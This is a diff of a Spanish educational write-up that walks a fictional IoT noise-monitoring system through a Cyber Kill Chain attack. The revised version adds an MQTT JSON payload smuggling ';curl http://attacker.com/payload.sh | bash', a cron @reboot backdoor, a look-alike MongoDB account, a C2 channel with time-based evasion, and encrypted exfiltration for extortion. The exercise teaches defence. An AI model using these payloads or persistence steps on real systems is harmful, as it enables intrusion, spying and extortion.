@@ -10,111 +10,142 @@
 Sistema IoT de monitoreo de niveles de ruido en entornos cerrados o pequeñas áreas urbanas. Utiliza sensores conectados a microcontroladores ESP32 con conectividad Wi-Fi y LoRa, enviando los datos a una base de datos en la nube. El acceso a la información se realiza a través de un dashboard web, desde donde se configuran umbrales de alerta y se visualizan datos históricos.
 
 ## Objetivo del Ataque
-El objetivo de este ataque es doble: por un lado, sabotear la confiabilidad del sistema de monitoreo acústico para generar desconfianza en clientes institucionales, comprometiendo la integridad de sus mediciones y su reputación; por el otro, capturar y exfiltrar datos acústicos sensibles que podrían ser utilizados en campañas de extorsión o espionaje industrial. La premisa parte del supuesto de que los datos de ruido pueden ser correlacionados con actividad humana o patrones que revelen dinámicas internas de organizaciones. Además, se busca mantener persistencia dentro del sistema comprometido para preparar futuros ataques.
+Lograr acceso persistente y silencioso al sistema de monitoreo de ruido para exfiltrar información acústica sensible en entornos críticos, sin ser detectado por los administradores. Estos datos podrían ser utilizados con fines de espionaje industrial o extorsión, aprovechando la sensibilidad de los entornos monitoreados como hospitales, oficinas públicas o empresas privadas.La premisa parte del supuesto de que los datos de ruido pueden ser correlacionados con actividad humana o patrones que revelen dinámicas internas de organizaciones.
 
 ## Resolución del Ataque: Cyber Kill Chain
 
-### 1️⃣ Reconnaissance (Reconocimiento)
-Se explora documentación pública, redes sociales y GitHub en busca de información del equipo técnicopara identificar las tecnologías utilizadas (ESP32, JWT), correos electrónicos y endpoints accesibles. Esto va a permitir perfilar objetivos concretos para spear phishing y entender la arquitectura del sistema.
+### 1️⃣ Reconnaissance
+
+Realizo un análisis de superficie a través de fuentes abiertas:
+
+- Encuentro el repositorio público del proyecto en GitHub, donde se detallan endpoints como `/api/data` y `/api/export/csv`.
+- Encuentro documentación técnica que menciona el uso de ESP32, MQTT, JWT y un backend en Node.js con MongoDB.
+- Descubro nombres de usuarios en los commits y archivos `.md`.
+- Detecto un entorno de pruebas expuesto públicamente (`iot-staging.example.ar`) sin autenticación, por un despliegue de staging mal configurado.
+- Utilizo herramientas como `WhatWeb`, `nmap` y `wig` para analizar encabezados HTTP, puertos abiertos, y versiones de servicios, lo que me permite confirmar la presencia de MongoDB, Express y un broker MQTT expuesto.
 
 - **Técnicas ATT&CK utilizadas:**
-  - T1592.002 – Gather Victim Identity Information: Email Addresses  
-    https://attack.mitre.org/techniques/T1592/002/
-  - T1593 – Search Open Websites/Domains  
-    https://attack.mitre.org/techniques/T1593/
+- T1593 – Search Open Websites/Domains
+  https://attack.mitre.org/techniques/T1593/  
+- T1592.002 – Gather Victim Identity Information: Email Addresses
+  https://attack.mitre.org/techniques/T1589/002/
+  ---  
     
 ### 2️⃣ Weaponization 
 
-Clono la interfaz del dashboard y preparo correos electrónicos con enlaces maliciosos personalizados con el objetivo de descubrir si algunas variables sensibles del sistema se pasaan en la URL, obtener pistas sobre su comportamiento interno y facilitar la creación de señuelos creíbles.
+Con la información recolectada:
+
+- Descargo datos exportados en JSON desde `/api/export/csv` para analizar la estructura de los registros acústicos.
+- Desarrollo un script en Python que simula un ESP32 falso y puede enviar datos al sistema.
+- Identifico una ruta `/upload/config` usada para actualizaciones y la preparo como vector de entrega.
 
 - **Técnicas ATT&CK utilizadas:**
-  - T1566.001 – Phishing: Spearphishing Attachment  
-    https://attack.mitre.org/techniques/T1566/001/
-  - CWE-598 – Information Exposure Through Query Strings in GET Request  
-    https://cwe.mitre.org/data/definitions/598.html
+- T1608.001 – Stage Capabilities: Upload Malware
+  https://attack.mitre.org/techniques/T1608/001/  
+- CWE-434 – Unrestricted File Upload
+  https://cwe.mitre.org/data/definitions/434.html
+  ---
 
 ### 3️⃣ Delivery 
 
-Distribuir los correos usando SMTP anónimo y campañas dirigidas. Esperar que uno de los operadores caiga en el señuelo y entregue sus credenciales. Esto permitira obtener un token JWT válido para acceder al backend como usuario legítimo.
+Utilizo la ruta `/upload/config` para subir un archivo `.conf` aparentemente legítimo, pero que incluye una carga útil que ejecuta una shell inversa hacia mi servidor.
 
-- **Técnicas ATT&CK utilizadas:**
-  - T1566.002 – Phishing: Spearphishing Link  
-    https://attack.mitre.org/techniques/T1566/002/
-
-### 4️⃣ Exploitation (Explotación de la Vulnerabilidad)
-Ingresar con el JWT al sistema, modificar umbrales de ruido y alterar registros históricos. Si no se tiene firma digital ni validación de origen en los datos se pude inyectar eventos falsos que simulan problemas acústicos graves, especialmente en instituciones clave.
-
-### Payload Malicioso para Manipular Registros de Ruido
+También preparo un payload MQTT malicioso:
 
 ```json
 {
-  "sensor_id": "node-3",
-  "timestamp": "2025-04-01T12:00:00Z",
-  "dB_level": 98,
-  "location": "Hospital X - Terapia Intensiva",
-  "alert": true
+  "sensor_id": "node-5",
+  "timestamp": "2025-04-01T15:30:00Z",
+  "dB_level": 55,
+  "extra": ";curl http://attacker.com/payload.sh | bash"
 }
 ```
+
+Este payload es aceptado por el backend debido a validaciones débiles del esquema JSON, que no filtra campos no reconocidos como `extra`.
+
 - **Técnicas ATT&CK utilizadas:**
-  - T1078 – Valid Accounts  
-    https://attack.mitre.org/techniques/T1078/
-  - T1565.001 – Data Manipulation: Stored Data Manipulation  
-    https://attack.mitre.org/techniques/T1565/001/
-- **CWE relevante:**
-  - CWE-345 – Insufficient Verification of Data Authenticity  
-    https://cwe.mitre.org/data/definitions/345.html
+- T1203 – Exploitation for Client Execution
+  https://attack.mitre.org/techniques/T1203/
+- T1059.006 – Command and Scripting Interpreter: Python
+  https://attack.mitre.org/techniques/T1059/006/
+  ---
+
+### 4️⃣ Exploitation 
+Una vez que el archivo fue ejecutado por el backend, accedo a la consola remota y navego por los registros de sensores.
+
+Inserto un hook en el proceso que maneja las mediciones entrantes para duplicar silenciosamente cada entrada nueva y enviarla a mi servidor.
+
+**Técnicas ATT&CK:**
+- T1055.001 – Process Injection
+  https://attack.mitre.org/techniques/T1055/001/
+- T1565.001 – Data Manipulation: Stored Data Manipulation
+  https://attack.mitre.org/techniques/T1565/001/
+  ---
 
 
-### 5️⃣ Installation (Persistencia)
-Instalar una web shell PHP en el servidor backend usando una vulnerabilidad en la API. Luego programar tareas periódicas (cron) para restaurar la puerta trasera y asegurarme de que sobreviviera a reinicios o intentos de remediación.
+### 5️⃣ Installation 
+Creo una tarea `cron` en el servidor comprometido:
 
+```bash
 @reboot /usr/bin/python3 /var/backups/refresh_backdoor.py
+```
 
-Este cronjob se instala en el sistema víctima para asegurar que la puerta trasera (webshell o script de control) se ejecute automáticamente cada vez que el servidor se reinicie.
+Esto garantiza que el proceso de exfiltración continúe incluso tras reinicios.
+
+Además, inserto un nuevo usuario en MongoDB con nombre `admin_support2`, que se asemeja a los del sistema. Le asigno un rol de bajo perfil (`logger_readonly`) para evitar levantar sospechas inmediatas en posibles auditorías.
 
 - **Técnicas ATT&CK utilizadas:**
-  - T1053.003 – Scheduled Task/Job: Cron  
-    https://attack.mitre.org/techniques/T1053/003/
-  - T1505.003 – Server Software Component: Web Shell  
-    https://attack.mitre.org/techniques/T1505/003/
+- T1053.003 – Scheduled Task/Job: Cron
+  https://attack.mitre.org/techniques/T1053/003/ 
+- T1136.001 – Create Account: Local Account
+  https://attack.mitre.org/techniques/T1136/001/
+  ---
 
 ### 6️⃣ Command & Control (C2)
 
-Desde un servidor externo bajo mi control, establecer un canal HTTPS para monitorear la operación, subir scripts y automatizar comandos maliciosos. Usar scripts en Python para mantener sincronización entre la shell remota y el entorno C2
+Establezco un canal HTTPS que conecta el backend comprometido con mi servidor C2 externo. A través de él, controlo cuándo enviar datos, actualizar el script o detenerlo para evitar detección.
+
+El script evalúa condiciones antes de ejecutar: sólo se activa en horas de baja actividad (03:00–04:00 AM) y suspende su ejecución si detecta cambios recientes en el archivo `.env` del sistema.
 
 - **Técnicas ATT&CK utilizadas:**
-  - T1071.001 – Application Layer Protocol: Web Protocols (HTTPS)  
-    https://attack.mitre.org/techniques/T1071/001/
-  - T1105 – Ingress Tool Transfer  
-    https://attack.mitre.org/techniques/T1105/
+- T1071.001 – Application Layer Protocol: Web Protocols (HTTPS)
+  https://attack.mitre.org/techniques/T1071/001/
+- T1095 – Non-Application Layer Protocol
+  https://attack.mitre.org/techniques/T1095/
+  --- 
 
 
-### 7️⃣ Actions on Objectives (Acción sobre el Objetivo)
+### 7️⃣ Actions on Objectives 
 
-Alterar los dashboards públicos del sistema para mostrar datos alarmantes falsos. En paralelo enviar comunicaciones anónimas sugiriendo que los registros de audio podrían publicarse si no se realizaba un pago. Esto dañó la reputación del sistema e inutilizar en ambientes críticos.
+Empiezo a recibir datos acústicos en tiempo real desde entornos sensibles como hospitales o edificios gubernamentales.
+
+Los registros son comprimidos y cifrados con AES-256 antes de ser exfiltrados a través del canal HTTPS. Esto impide que sean interceptados incluso si se detecta tráfico anómalo.
+
+Analizo los patrones para inferir horarios de actividad, reuniones, presencia de personal, etc.  
+Preparo una campaña de extorsión sugiriendo que los datos podrían publicarse o venderse a terceros si no se realiza un pago.
 
 - **Técnicas ATT&CK utilizadas:**
-  - T1491.001 – Defacement: Internal Defacement  
-    https://attack.mitre.org/techniques/T1491/001/
-  - T1565.002 – Data Manipulation: Transmitted Data Manipulation  
-    https://attack.mitre.org/techniques/T1565/002/
+- T1119 – Automated Collection
+  https://attack.mitre.org/techniques/T1119/  
+- T1567.002 – Exfiltration Over Web Service
+  https://attack.mitre.org/techniques/T1567/ 
 
 ## Diagrama de Flujo del Ataque
-(El diagrama se incluirá en una versión posterior en formato gráfico)
 
-1. [Reconocimiento: OSINT + Infraestructura]
+1. Recolección OSINT + escaneo técnico
          ⬇
-2. [Phishing dirigido: clonado del dashboard]
+2. Desarrollo de payload y análisis de estructura
          ⬇
-3. [Captura de credenciales y JWT]
+3. Entrega vía `/upload/config` o MQTT  
          ⬇
-4. [Modificación de datos y registros]
+4. Ejecución + shell remota
          ⬇
-5. [Persistencia: webshell y cronjob]
+5. Cronjob + usuario oculto
          ⬇
-6. [C2 cifrado desde servidor externo]
+6. C2 con horarios programados
          ⬇
-7. [Sabotaje + extorsión + exfiltración acústica]
+7. Exfiltración cifrada y controlada
+   ---
 
 ## 💡 Inspiración del Ataque
 
@@ -122,8 +153,8 @@ Este ataque toma inspiración en campañas reales de sabotaje y espionaje indust
 
 
 ## Conclusión
-Este ataque revela la importancia de implementar autenticación robusta, validación de datos, cifrado de extremo a extremo y control de acceso por niveles. A través de vulnerabilidades aparentemente menores, fue posible comprometer por completo un sistema crítico de monitoreo ambiental.
+Este ejercicio demuestra cómo, con información mínima expuesta al público, es posible construir un ataque completo, silencioso y persistente contra un sistema IoT. En lugar de interrumpir el servicio o dañar el sistema, el objetivo es recolectar y explotar datos valiosos que el sistema genera continuamente.
 
-También fue un desafío narrar el ataque desde una lógica realista y secuencial, utilizando el enfoque de la Cyber Kill Chain, que permitió visualizar cómo un incidente de seguridad puede evolucionar etapa por etapa, hasta escalar en consecuencias que afectan a usuarios, instituciones y entornos sociales.
+Además, al incorporar técnicas de evasión horaria, exfiltración cifrada y persistencia oculta, se muestra cómo un atacante puede permanecer sin ser detectado durante largo tiempo. Esto refuerza la necesidad de aplicar controles de validación de datos, segmentación de servicios, autenticación fuerte, y auditoría constante de logs y cuentas del sistema.
 
 Este ejercicio ayuda a mirar los proyectos con una mirada más crítica y consciente: cada línea de código, cada endpoint, cada sensor, puede convertirse en un punto de entrada si no se lo protege adecuadamente. 
